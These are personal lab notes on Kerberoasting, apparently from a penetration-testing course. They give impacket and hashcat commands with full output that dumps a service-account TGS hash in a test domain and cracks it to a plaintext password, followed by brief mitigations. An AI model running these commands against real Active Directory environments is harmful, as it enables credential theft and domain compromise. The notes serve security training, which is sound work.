#Kerberoasting #hashcat #impacket #SPNs 
- takes advantage of service accounts (SPN - Service Principal Name)
1. Request TGT w/ NTLM hash
2. Receive TGT encrypted w/ krbtgt hash
3. Request TGS for Server (Presents TGT)
4. Receive TGS encrypted w/ server account hash ==Part we care about ==

- KDC (Key Distriubution Center) aka DC

**Goal of Kerberoasting:**
	Get TGS and decrypt server's account hash

Step 1: Get SPNs, Dump Hash
```
impacket-GetUserSPNs <DOMAIN/username:password> -dc-ip <ip of DC> -request
```

Results:
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/4)─┐
└─(18:10:05)──> impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 192.168.95.132 -request    2 ↵ ──(Tue,Jul02)─┘
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName                    Name        MemberOf                                         PasswordLastSet             LastLogon  Delegation 
--------------------------------------  ----------  -----------------------------------------------  --------------------------  ---------  ----------
HYDRA-DC/SQLService.MARVEL.local:60111  SQLService  CN=Administrators,CN=Builtin,DC=MARVEL,DC=local  2024-06-26 10:20:07.481884  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$87830bf565058bb4a33bb9b5db581247$01bec903f72f85bf7d0578db82a22249ac8b7fc2a377aab5c9076b2a68ffb04e0055e3fb4423ae5b9c7c0a88a7f1374168fe33e4c0417c7764d22ef583b777aca774b7dd2046b11cec825f014e987934456b469069152fd83cc0353d4e015146acc90dd8acf147ef90694dd68848ab215a6b587e1e6d672d798900b8b8c30f85722f93b03572d4674803610cc5b20c003b613a7fe674ba11081df116f8b7db86d38ddc4441fd32108f7759568434a6653744493b47afabe812779e4a2b79b987da14e8e7cdf9cd712a741ec831dd848ebba7e1a61e687cf1bc666d08133e5579dcbf80bbb541ae4f8d94b90d55ca5bc3c18822d06a2b3a2efcf080456f9e31e4b1e7afeecc0894b1bda1e38c20a3396e46fd431622099e088a3aa55d529f822c593937c573e45d48254164c1a6da30b7a034f3acbbca1489fb4eb35d6ac87c745b91dfafd9d291969308c7f0a1fbe1e2d092f16744cc85ef997e1207016aedd1d85d9eec30bb08a364e32e137bedf2214f0aebff1b55305d0fad8b68179a583c1d03602a6df5c76da8d43ddcfce48b3a0e8e31d4d41a177944db77d0d0997d9c34a9c962e5cc3ffb014989e9f1dcfd408a39ae8b9d6047359bbad690ca444751b55d5a52f36cd8a169666e4f96955e66e77d5f902fcff4c39e3d626cac421d036d8445274f121a14b9f26fc95a7c7df0241062a1a7ba979999bcc92acd34c397710617691a0a9fd3f7314afadfbc39c3505fa4ee0bf089983ed972a135b9b84f2149b5644ac7a804da3be4aa932ab7fa9a6d5b07ee2d1cf82aa4038ff332d372faf2180db4d00c243fd63ef7ecf2fedf90c4184be75e6b294d3bf28a9b0b55cfbbc8fafcafd66e011cb4efb7abf6e6914c658de71e3ee448d18b3c83ec6c4e80b44ab9c898a3b97910e30cb8e310dfde3d9e05dd43148dce29bac6a4753d2f00f6653478203714cab2b33c7b5eb6d1440345410c0cfba7f310bb4ac1f446fa7abe22a81d3642fd5e2272415bfb7fb6e41ba40257ee82d64d85f051c69ab5705c1c31b78ebc78e8ed01cfb13b2cc413ed405f1dbe5a994f42e573dd78c2db2d258f37d9d4e3d30bd8c94e6ef94f5a2933f8aa9c0d0e80032a7916c765089251181746575fbabc3b524b9fdfd75fdfc5675097cde17bbc4868ff1344404164a20fdfb60f91702f281d50a0a4d7dc952833fccfdf4f78e5b57dc086cb9188a1f5b0aa3c3a4a8080347370679071e3c3ad31f182959a98cd2855694d17bbb4c99df0457cf0dfec6a75755a2a8b7198902b44736c6448c8cc80d850c07ca483b6ed1ed3a59d084c4bfeb42d9f08ab13d24434dc5084344115b89c44332f218c39a6f6f12f350b1bc6cb7f3cbb6a5db0cee2df88b673ec04b55a3dc9d6b595d6655f89da93332024dd88eeb3b26bd5dea3baa8e1cce44d14274628c88a9162
```
Service Account is running in Domain Admin group... Grab the full hash

Step 2: Crack the hash (krb = kerberoast)
```
hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
```

Results:
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/4)─┐
└─(18:12:23)──> hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt                                 ──(Tue,Jul02)─┘
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 7800X3D 8-Core Processor, 6939/13943 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$87830bf565058bb4a33bb9b5db581247$01bec903f72f85bf7d0578db82a22249ac8b7fc2a377aab5c9076b2a68ffb04e0055e3fb4423ae5b9c7c0a88a7f1374168fe33e4c0417c7764d22ef583b777aca774b7dd2046b11cec825f014e987934456b469069152fd83cc0353d4e015146acc90dd8acf147ef90694dd68848ab215a6b587e1e6d672d798900b8b8c30f85722f93b03572d4674803610cc5b20c003b613a7fe674ba11081df116f8b7db86d38ddc4441fd32108f7759568434a6653744493b47afabe812779e4a2b79b987da14e8e7cdf9cd712a741ec831dd848ebba7e1a61e687cf1bc666d08133e5579dcbf80bbb541ae4f8d94b90d55ca5bc3c18822d06a2b3a2efcf080456f9e31e4b1e7afeecc0894b1bda1e38c20a3396e46fd431622099e088a3aa55d529f822c593937c573e45d48254164c1a6da30b7a034f3acbbca1489fb4eb35d6ac87c745b91dfafd9d291969308c7f0a1fbe1e2d092f16744cc85ef997e1207016aedd1d85d9eec30bb08a364e32e137bedf2214f0aebff1b55305d0fad8b68179a583c1d03602a6df5c76da8d43ddcfce48b3a0e8e31d4d41a177944db77d0d0997d9c34a9c962e5cc3ffb014989e9f1dcfd408a39ae8b9d6047359bbad690ca444751b55d5a52f36cd8a169666e4f96955e66e77d5f902fcff4c39e3d626cac421d036d8445274f121a14b9f26fc95a7c7df0241062a1a7ba979999bcc92acd34c397710617691a0a9fd3f7314afadfbc39c3505fa4ee0bf089983ed972a135b9b84f2149b5644ac7a804da3be4aa932ab7fa9a6d5b07ee2d1cf82aa4038ff332d372faf2180db4d00c243fd63ef7ecf2fedf90c4184be75e6b294d3bf28a9b0b55cfbbc8fafcafd66e011cb4efb7abf6e6914c658de71e3ee448d18b3c83ec6c4e80b44ab9c898a3b97910e30cb8e310dfde3d9e05dd43148dce29bac6a4753d2f00f6653478203714cab2b33c7b5eb6d1440345410c0cfba7f310bb4ac1f446fa7abe22a81d3642fd5e2272415bfb7fb6e41ba40257ee82d64d85f051c69ab5705c1c31b78ebc78e8ed01cfb13b2cc413ed405f1dbe5a994f42e573dd78c2db2d258f37d9d4e3d30bd8c94e6ef94f5a2933f8aa9c0d0e80032a7916c765089251181746575fbabc3b524b9fdfd75fdfc5675097cde17bbc4868ff1344404164a20fdfb60f91702f281d50a0a4d7dc952833fccfdf4f78e5b57dc086cb9188a1f5b0aa3c3a4a8080347370679071e3c3ad31f182959a98cd2855694d17bbb4c99df0457cf0dfec6a75755a2a8b7198902b44736c6448c8cc80d850c07ca483b6ed1ed3a59d084c4bfeb42d9f08ab13d24434dc5084344115b89c44332f218c39a6f6f12f350b1bc6cb7f3cbb6a5db0cee2df88b673ec04b55a3dc9d6b595d6655f89da93332024dd88eeb3b26bd5dea3baa8e1cce44d14274628c88a9162:MYpassword123#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/S...8a9162
Time.Started.....: Tue Jul  2 18:13:20 2024 (6 secs)
Time.Estimated...: Tue Jul  2 18:13:26 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1739.3 kH/s (1.31ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10846208/14344385 (75.61%)
Rejected.........: 0/10846208 (0.00%)
Restore.Point....: 10842112/14344385 (75.58%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Magic01 -> MYSELFonly4EVER
Hardware.Mon.#1..: Util: 68%

Started: Tue Jul  2 18:13:10 2024
Stopped: Tue Jul  2 18:13:27 2024
```

# Mitigation Strategies
- Strong Passwords
- Least Privileges
- Don't store passwords in descriptions of AD account
- Service account should not run as Domain Admin